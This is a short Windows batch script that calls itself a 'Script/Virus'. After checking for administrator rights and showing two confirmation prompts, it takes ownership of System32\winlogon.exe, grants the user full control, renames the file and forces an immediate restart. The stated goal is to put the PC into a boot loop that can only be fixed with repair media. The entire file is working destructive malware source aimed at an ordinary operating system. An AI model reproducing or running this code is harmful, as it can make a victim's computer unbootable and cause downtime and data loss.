@echo off

C:\~\checkcode.bat
cls

cd %windir%
echo. >>testperm.txt
if exist testperm.txt (
del testperm.txt
) else (
cls
for /l %%x in (1, 1, 8) do echo.
echo Please run this script as administrator
pause>>nul
exit
)

echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo This Script/Virus will put your pc into bootloop and make it unaccessible unless you prepared a boot media to repair it.
echo.
echo If you still want to continue, press any button. Else, close this window.
pause>>nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo Are you sure? This is your last chance to cancel the process!
pause>>nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo Well, it's your fault what will happen now. Have "fun".
timeout 5 >>nul

cd C:\Windows\System32
takeown /f .\winlogon.exe
icacls .\winlogon.exe /grant %username%:f
ren .\winlogon.exe _notwinlogon.exe

IF EXIST _notwinlogon.exe (shutdown /g /t 0) ELSE echo An unexpected error occured. Please try again later.